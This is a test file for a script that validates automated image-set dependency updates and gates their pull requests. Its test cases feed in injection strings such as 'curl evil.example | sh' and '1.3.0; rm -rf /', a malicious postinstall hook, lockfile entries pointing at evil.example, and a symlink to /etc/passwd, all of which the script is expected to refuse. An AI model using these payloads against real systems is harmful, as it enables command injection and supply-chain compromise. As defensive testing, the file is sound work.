import {execFileSync, spawnSync} from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {afterEach, beforeEach, describe, expect, it} from 'vitest';
import customConfig from '@/imageset.custom.json';
import {compareVersions, pullRequestBody, validateInput, VERSION_PATTERN} from '@/scripts/image-set-update.mjs';

const script = path.resolve(__dirname, '../../../scripts/image-set-update.mjs');

describe('validateInput (the event payload of image-set-update.yml)', () => {
  it('accepts an official set and a plain x.y.z version', () => {
    expect(validateInput('image-overwatch', '1.3.0', customConfig, '1.2.0')).toEqual({packageName: 'image-overwatch', version: '1.3.0', same: false});
    expect(validateInput('image-reachthefinals', '10.0.0', customConfig, '1.3.0').same).toBe(false);
    expect(validateInput('image-overwatch', '1.2.0', customConfig, '1.2.0').same).toBe(true);
  });

  it.each([
    ['an unknown package', 'image-unknown', 'is not an official image set'],
    ['a legacy set', 'image-supervive', 'is not an official image set'],
    ['the template package', 'image-set', 'is not an official image set'],
    ['a package outside the image sets', 'left-pad', 'is not an image set name'],
    ['a scoped package', '@evil/image-overwatch', 'is not an image set name'],
    ['shell metacharacters', 'image-overwatch; curl evil.example | sh', 'is not an image set name'],
    ['command substitution', 'image-$(id)', 'is not an image set name'],
    ['backticks', 'image-`id`', 'is not an image set name'],
    ['a newline', 'image-overwatch\nimage-reachthefinals', 'is not an image set name'],
    ['a version after the name', 'image-overwatch@1.3.0', 'is not an image set name'],
    ['a very long name', `image-${'a'.repeat(80)}`, 'is not an image set name'],
    ['nothing', '', 'No package name'],
    ['a number', 42, 'No package name'],
  ])('refuses %s as the package', (_name, packageName, message) => {
    expect(() => validateInput(packageName, '1.3.0', customConfig)).toThrow(message);
  });

  it.each([
    ['a "+" build suffix', '1.3.0+build.5'],
    ['a pre-release', '1.3.0-beta.1'],
    ['a "v" prefix', 'v1.3.0'],
    ['two parts', '1.3'],
    ['four parts', '1.3.0.1'],
    ['leading zeros', '01.3.0'],
    ['a range', '^1.3.0'],
    ['a tag', 'latest'],
    ['shell metacharacters', '1.3.0; rm -rf /'],
    ['command substitution', '$(touch pwned)'],
    ['a trailing newline', '1.3.0\n'],
    ['a workflow command', '1.3.0\n::error::injected'],
    ['spaces', ' 1.3.0'],
    ['a huge number', '1.3.1234567890'],
    ['nothing', ''],
  ])('refuses %s as the version', (_name, version) => {
    expect(() => validateInput('image-overwatch', version, customConfig)).toThrow(/version/);
  });

  it('refuses an older version than the one in package.json (a replayed event)', () => {
    expect(() => validateInput('image-overwatch', '1.1.9', customConfig, '1.2.0')).toThrow('older than 1.2.0');
  });

  it('quotes refused values on one line, so they cannot start a workflow command', () => {
    try {
      validateInput('image-overwatch', '1.3.0\n::error::injected', customConfig);
    } catch (error) {
      expect((error as Error).message).not.toContain('\n');
      expect((error as Error).message).toContain('"1.3.0\\n::error::injected"');
    }
  });

  it('compares versions by number', () => {
    expect(compareVersions('1.10.0', '1.9.9')).toBeGreaterThan(0);
    expect(compareVersions('2.0.0', '10.0.0')).toBeLessThan(0);
    expect(compareVersions('1.2.3', '1.2.3')).toBe(0);
    expect(VERSION_PATTERN.test('0.0.0')).toBe(true);
  });
});

/** A small repository shaped like opentierboy, with image-ow 1.0.0 installed. */
const INTEGRITY = (char: string) => `sha512-${char.repeat(86)}==`;
const LOCK_BASE = {
  name: 'app',
  version: '1.0.0',
  lockfileVersion: 3,
  requires: true,
  packages: {
    '': {name: 'app', version: '1.0.0', dependencies: {'image-ow': '1.0.0', 'lz-string': '1.5.0'}, devDependencies: {eslint: '9.0.0'}},
    'node_modules/image-ow': {version: '1.0.0', resolved: 'https://registry.npmjs.org/image-ow/-/image-ow-1.0.0.tgz', integrity: INTEGRITY('a'), dependencies: {prompts: '^5.0.0'}},
    'node_modules/prompts': {version: '5.0.0', resolved: 'https://registry.npmjs.org/prompts/-/prompts-5.0.0.tgz', integrity: INTEGRITY('b'), dependencies: {chalk: '^4'}},
    'node_modules/chalk': {version: '4.0.0', resolved: 'https://registry.npmjs.org/chalk/-/chalk-4.0.0.tgz', integrity: INTEGRITY('c')},
    'node_modules/lz-string': {version: '1.5.0', resolved: 'https://registry.npmjs.org/lz-string/-/lz-string-1.5.0.tgz', integrity: INTEGRITY('d')},
    'node_modules/eslint': {version: '9.0.0', resolved: 'https://registry.npmjs.org/eslint/-/eslint-9.0.0.tgz', integrity: INTEGRITY('e'), dev: true, dependencies: {chalk: '^4'}},
  },
};
const image = (filename: string, label: string, tags: string[] = ['heroes']) => ({filename, label, tags});
const CONFIG_BASE = {
  packages: {
    'image-old': {displayName: 'Old', images: [image('x.webp', 'X')], tags: {heroes: {title: 'Heroes', description: 'Heroes', category: 'general'}}, legacy: true},
    'image-ow': {
      displayName: 'OW',
      images: [image('ana.webp', 'Ana'), image('mei.webp', 'Mei')],
      tags: {heroes: {title: 'Heroes', description: 'Heroes', category: 'general'}},
    },
  },
};
const registry = (config: typeof CONFIG_BASE) => Object.fromEntries(Object.entries(config.packages).flatMap(([name, set]) => (
  set.images.map((img) => [`${name}-${img.filename}`, {package: name, filename: img.filename, label: img.label}])
)));

describe('scripts/image-set-update.mjs', () => {
  let repo: string;

  const git = (...args: string[]) => execFileSync('git', ['-c', 'user.name=Test', '-c', 'user.email=test@example.com', '-c', 'commit.gpgsign=false', ...args], {cwd: repo, encoding: 'utf8'});
  const write = (file: string, value: unknown) => {
    fs.mkdirSync(path.dirname(path.join(repo, file)), {recursive: true});
    fs.writeFileSync(path.join(repo, file), typeof value === 'string' || Buffer.isBuffer(value) ? value : JSON.stringify(value, null, 2) + '\n');
  };
  const run = (command: string, env: Record<string, string>, ...args: string[]) => {
    const result = spawnSync(process.execPath, [script, command, ...args], {cwd: repo, encoding: 'utf8', env: {...process.env, ...env, GITHUB_OUTPUT: path.join(repo, '.output')}});
    return {status: result.status, output: `${result.stdout}${result.stderr}`};
  };
  const gate = (version = '1.1.0') => run('gate', {PACKAGE: 'image-ow', VERSION: version}, '--body', path.join(repo, '.body.md'));

  /** Stages what `npm install image-ow@1.1.0` and prepareImages would change: one new image, one new label. */
  const stageUpdate = (change: {config?: typeof CONFIG_BASE; lock?: typeof LOCK_BASE} = {}) => {
    const pkg = JSON.parse(fs.readFileSync(path.join(repo, 'package.json'), 'utf8'));
    pkg.dependencies['image-ow'] = '1.1.0';
    write('package.json', pkg);
    const lock = change.lock ?? structuredClone(LOCK_BASE);
    if (!change.lock) {
      lock.packages[''].dependencies['image-ow'] = '1.1.0';
      lock.packages['node_modules/image-ow'] = {version: '1.1.0', resolved: 'https://registry.npmjs.org/image-ow/-/image-ow-1.1.0.tgz', integrity: INTEGRITY('f')} as never;
      delete (lock.packages as Record<string, unknown>)['node_modules/prompts'];
      // chalk stays, needed by eslint only now: npm marks it dev.
      (lock.packages['node_modules/chalk'] as Record<string, unknown>).dev = true;
    }
    write('package-lock.json', lock);
    const config = change.config ?? structuredClone(CONFIG_BASE);
    if (!change.config) {
      config.packages['image-ow'].images[1].label = 'Mei-Ling';
      config.packages['image-ow'].images.push(image('heroes/wuyang.webp', 'Wuyang'));
    }
    write('imageset.config.json', JSON.stringify(config, null, 2));
    write('image-registry.lock.json', {...registry(CONFIG_BASE), ...Object.fromEntries(Object.entries(registry(config)).filter(([id]) => !(id in registry(CONFIG_BASE))))});
    git('add', '-A', '--', 'package.json', 'package-lock.json', 'imageset.config.json', 'image-registry.lock.json', 'image-aliases.json');
  };

  beforeEach(() => {
    repo = fs.mkdtempSync(path.join(os.tmpdir(), 'otb-image-set-update-'));
    git('init', '-q', '-b', 'main');
    write('package.json', {name: 'app', version: '1.0.0', dependencies: {'image-ow': '1.0.0', 'lz-string': '1.5.0'}, devDependencies: {eslint: '9.0.0'}});
    write('package-lock.json', LOCK_BASE);
    write('imageset.custom.json', {packages: {'image-old': {legacy: true}, 'image-ow': {displayName: 'OW'}}});
    write('imageset.legacy.json', {'image-old': CONFIG_BASE.packages['image-old']});
    write('imageset.config.json', JSON.stringify(CONFIG_BASE, null, 2));
    write('image-registry.lock.json', registry(CONFIG_BASE));
    write('image-aliases.json', {});
    write('README.md', 'app\n');
    git('add', '-A');
    git('commit', '-q', '-m', 'base');
  });

  afterEach(() => {
    fs.rmSync(repo, {recursive: true, force: true});
  });

  describe('validate', () => {
    it('writes the checked values to $GITHUB_OUTPUT', () => {
      const result = run('validate', {PACKAGE: 'image-ow', VERSION: '1.1.0'});
      expect(result.status).toBe(0);
      expect(fs.readFileSync(path.join(repo, '.output'), 'utf8')).toBe('package=image-ow\nversion=1.1.0\nsame=false\n');
    });

    it('reports when package.json already has the version', () => {
      const result = run('validate', {PACKAGE: 'image-ow', VERSION: '1.0.0'});
      expect(result.status).toBe(0);
      expect(result.output).toContain('Nothing to update');
      expect(fs.readFileSync(path.join(repo, '.output'), 'utf8')).toContain('same=true');
    });

    it.each([
      ['an unknown package', {PACKAGE: 'image-nope', VERSION: '1.1.0'}],
      ['a legacy package', {PACKAGE: 'image-old', VERSION: '1.1.0'}],
      ['shell metacharacters', {PACKAGE: 'image-ow;id', VERSION: '1.1.0'}],
      ['a non-semver version', {PACKAGE: 'image-ow', VERSION: '1.1'}],
      ['a "+" build suffix', {PACKAGE: 'image-ow', VERSION: '1.1.0+b1'}],
      ['a downgrade', {PACKAGE: 'image-ow', VERSION: '0.9.0'}],
      ['no values', {PACKAGE: '', VERSION: ''}],
    ])('refuses %s and writes no output', (_name, env) => {
      const result = run('validate', env);
      expect(result.status).toBe(1);
      expect(result.output).toContain('refused:');
      expect(fs.existsSync(path.join(repo, '.output'))).toBe(false);
      expect(result.output.split('\n').some((line) => line.startsWith('::'))).toBe(false);
    });

    it('reads the official list from HEAD, not from the working tree', () => {
      write('imageset.custom.json', {packages: {'image-old': {legacy: true}, 'image-ow': {}, 'image-evil': {}}});
      expect(run('validate', {PACKAGE: 'image-evil', VERSION: '1.0.0'}).status).toBe(1);
    });
  });

  describe('gate', () => {
    it('accepts an update and writes the pull request text', () => {
      stageUpdate();
      const result = gate();
      expect(result.output).toContain('changes nothing else');
      expect(result.status).toBe(0);
      const body = fs.readFileSync(path.join(repo, '.body.md'), 'utf8');
      expect(body).toContain('### Added item ids (1)\n\n- `image-ow-heroes/wuyang.webp`');
      expect(body).toContain('### Changed labels (1)');
      expect(body).toContain('`image-ow-mei.webp`: `Mei` → `Mei-Ling`');
      expect(body).toContain('### New aliases (0)\n\n- none');
      expect(body).toContain('### Packages removed from package-lock.json (1)');
      expect(body).not.toContain('Shapes other than square');
    });

    it('accepts an alias from an id it removes to an id it adds (A32)', () => {
      const config = structuredClone(CONFIG_BASE);
      config.packages['image-ow'].images[1] = image('mei-v2.webp', 'Mei');
      stageUpdate({config});
      write('image-aliases.json', {'image-ow-mei.webp': 'image-ow-mei-v2.webp'});
      git('add', 'image-aliases.json');
      const result = gate();
      expect(result.output).toContain('changes nothing else');
      expect(result.status).toBe(0);
      expect(fs.readFileSync(path.join(repo, '.body.md'), 'utf8')).toContain('`image-ow-mei.webp` → `image-ow-mei-v2.webp`');
    });

    it('warns in the pull request about shapes other than square', () => {
      const config = structuredClone(CONFIG_BASE);
      (config.packages['image-ow'].images[0] as Record<string, unknown>).shape = 'portrait';
      stageUpdate({config});
      expect(gate().status).toBe(0);
      expect(fs.readFileSync(path.join(repo, '.body.md'), 'utf8')).toContain('**Do not merge before the drag and drop update (revamp Phase 5e).**');
    });

    const refusals: [string, () => void, string][] = [
      ['a change to another file', () => {
        write('README.md', 'changed\n');
        git('add', 'README.md');
      }, 'README.md: an image set update may not change this file'],
      ['a new workflow file', () => {
        write('.github/workflows/x.yml', 'on: push\n');
        git('add', '.github');
      }, '.github/workflows/x.yml: an image set update may not change this file'],
      ['a deleted file', () => git('rm', '-q', 'README.md'), 'README.md: change type D is not allowed'],
      ['another dependency in package.json', () => {
        const pkg = JSON.parse(fs.readFileSync(path.join(repo, 'package.json'), 'utf8'));
        pkg.dependencies['lz-string'] = '1.5.1';
        write('package.json', pkg);
        git('add', 'package.json');
      }, 'package.json: only dependencies.image-ow may change'],
      ['an npm script in package.json', () => {
        const pkg = JSON.parse(fs.readFileSync(path.join(repo, 'package.json'), 'utf8'));
        pkg.scripts = {postinstall: 'curl evil.example | sh'};
        write('package.json', pkg);
        git('add', 'package.json');
      }, 'package.json: only dependencies.image-ow may change'],
      ['a package added to package-lock.json', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/evil'] = {version: '1.0.0', resolved: 'https://registry.npmjs.org/evil/-/evil-1.0.0.tgz', integrity: INTEGRITY('z')};
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'package-lock.json: adds node_modules/evil'],
      ['a changed tarball of another package', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/lz-string'].resolved = 'https://evil.example/lz-string.tgz';
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'package-lock.json: changes node_modules/lz-string'],
      ['the package from another place than the npm registry', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/image-ow'].resolved = 'https://evil.example/image-ow-1.1.0.tgz';
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'must come from https://registry.npmjs.org/image-ow/-/image-ow-1.1.0.tgz'],
      ['an install script in the package', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/image-ow'].hasInstallScript = true;
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'has "hasInstallScript"'],
      ['a change to another image set', () => {
        const config = JSON.parse(fs.readFileSync(path.join(repo, 'imageset.config.json'), 'utf8'));
        config.packages['image-old'].images[0].label = 'Changed';
        write('imageset.config.json', config);
        git('add', 'imageset.config.json');
      }, 'imageset.config.json: image-old changed'],
      ['a removed registry entry', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'image-registry.lock.json'), 'utf8'));
        delete lock['image-old-x.webp'];
        write('image-registry.lock.json', lock);
        git('add', 'image-registry.lock.json');
      }, 'image-registry.lock.json: image-old-x.webp was removed'],
      ['an alias to an id that shipped before (A32)', () => {
        write('image-aliases.json', {'image-ow-mei.webp': 'image-ow-ana.webp'});
        git('add', 'image-aliases.json');
      }, 'An alias target must be a new id added in the same change'],
      ['a symbolic link', () => {
        fs.symlinkSync('/etc/passwd', path.join(repo, 'public-link'));
        git('add', 'public-link');
      }, 'public-link: mode 120000 is not allowed'],
    ];
    it.each(refusals)('refuses %s', (_name, change, message) => {
      stageUpdate();
      change();
      const result = gate();
      expect(result.output).toContain(message);
      expect(result.status).toBe(1);
    });

    it('refuses an image file that is not what its name says, in a committed image folder', () => {
      write('public/images/image-ow/ana.webp', Buffer.from('RIFF\0\0\0\0WEBPVP8 '));
      git('add', '-f', 'public');
      git('commit', '-q', '-m', 'commit the image folder');
      stageUpdate();
      write('public/images/image-ow/new.webp', '#!/bin/sh\necho not an image\n');
      git('add', '-f', 'public');
      const result = gate();
      expect(result.output).toContain('public/images/image-ow/new.webp: the file is not the image its name says');
      expect(result.status).toBe(1);
    });

    it('refuses a removed id without an alias (check-image-registry.mjs)', () => {
      const config = structuredClone(CONFIG_BASE);
      config.packages['image-ow'].images.pop();
      stageUpdate({config});
      const result = gate();
      expect(result.output).toContain('image-ow-mei.webp was shipped and is gone');
      expect(result.status).toBe(1);
    });

    it('refuses a patch that does not change the version', () => {
      const config = structuredClone(CONFIG_BASE);
      config.packages['image-ow'].images[0].label = 'Ana 2';
      write('imageset.config.json', JSON.stringify(config, null, 2));
      git('add', 'imageset.config.json');
      const result = gate();
      expect(result.output).toContain('package.json: dependencies.image-ow must be exactly 1.1.0');
      expect(result.status).toBe(1);
    });

    it('refuses an empty patch', () => {
      const result = gate();
      expect(result.output).toContain('The patch changes nothing');
      expect(result.status).toBe(1);
    });
  });

  it('keeps untrusted labels on one line in code spans in the pull request', () => {
    const body = pullRequestBody({
      packageName: 'image-ow', version: '1.1.0', added: [], removed: [], newAliases: [], shapes: [], removedLockEntries: [],
      relabelled: [{id: 'image-ow-a.webp', before: 'A', after: 'x`\n## @everyone [click](https://evil.example)'}],
    });
    expect(body).toContain('`image-ow-a.webp`: `A` → `x ## @everyone [click](https://evil.example)`');
    expect(body).not.toContain('\n## @everyone');
  });
});
